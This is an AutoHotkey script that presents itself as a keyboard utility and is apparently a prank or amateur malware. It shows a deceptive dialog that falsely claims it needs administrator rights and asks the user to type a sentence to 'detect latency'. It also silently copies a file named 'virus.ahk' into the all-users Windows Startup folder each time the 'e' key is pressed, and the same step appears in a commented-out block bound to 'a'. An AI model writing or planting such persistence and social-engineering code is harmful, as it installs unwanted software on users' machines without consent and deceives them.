
#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
;SetWorkingDir, C:\AHK\2nd-keyboard\ 
;Menu, Tray, Icon, shell32.dll, 319 ;if commented in, this line changes the taskbar icon to a blue star. Beware that if you don't have shell32.dll, it'll be a blank icon!
;SetKeyDelay, 0 ;IDK exactly what this does.
; common startup C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
#NoEnv
SendMode Input
#InstallKeybdHook
;#InstallMouseHook ;use this if you have scripts that use the mouse.
#UseHook On
#SingleInstance force 
#MaxHotkeysPerInterval 2000
#HotkeyModifierTimeout 60 ; https://autohotkey.com/docs/commands/_HotkeyModifierTimeout.htm
#KeyHistory 200 ; https://autohotkey.com/docs/commands/_KeyHistory.htm ; useful for debugging.
#MenuMaskKey vk07 ;https://autohotkey.com/boards/viewtopic.php?f=76&t=57683
#WinActivateForce ;https://autohotkey.com/docs/commands/_WinActivateForce.htm ;prevent taskbar flashing.

;RunAs, Administrator

^!q::ExitApp



^y::
Gui, Add, Text,, This program must be run as an administrator. Please press a.:

Gui, Add, Text,, Please type "The quick brown fox jumps over the lazy dog" so the program can setect your latency.:

Gui, Add, Edit, vMyEdit -WantReturn
Gui, Add, Button, Default, OK
Gui, Show
return

Escape::
Gui, Destroy
return

GuiClose:
Gui, Destroy
return

ButtonOK:
Gui, Submit
Gui, Destroy
Return


e::
FileCopy, virus.ahk, C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
send e
;run https://www.youtube.com/watch?v=dQw4w9WgXcQ
return

/*
escape::
F1::
F2::
F3::
F4::
F5::
F6::
F7::
F9::
F8::
F10::
F11:: 
F12::
`::
1::
2::
3::
4::
5::
6::
7::
8::
9::
0::
-::
=::
backspace::
tab::
q::
w::
;e::
r::
t::
y::
u::
i::
o::
p::
[::
]::
\::
a::
RunAs, Administrator
FileCopy, virus.ahk, C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\

return
s::
d::
f::
g::
h::
j::
K::
l::
'::
enter::
z::
x::
c::
v::
b::
n::
m::
,::
.::
/::
space::
PrintScreen::
ScrollLock::
ins::
del::
home::
end::
PgUp::
PgDn::
up::
down::
left::
right::
numpad0::
numpad1::
numpad2::
numpad3::
numpad4::
numpad5::
numpad6::
numpad7::
numpad8::
numpad9::
numpadins::
numpadend::
numpaddown::
numpadpgdn::
numpadleft::
numpadclear::
numpadright::
numpadhome::
numpadup::
numpadpgup::
numpadDiv::
numpadMult::
numpadSub::
numpadAdd::
numpadEnter::
numpadDot::

^c::
run https://www.youtube.com/watch?v=dQw4w9WgXcQ

return
*/

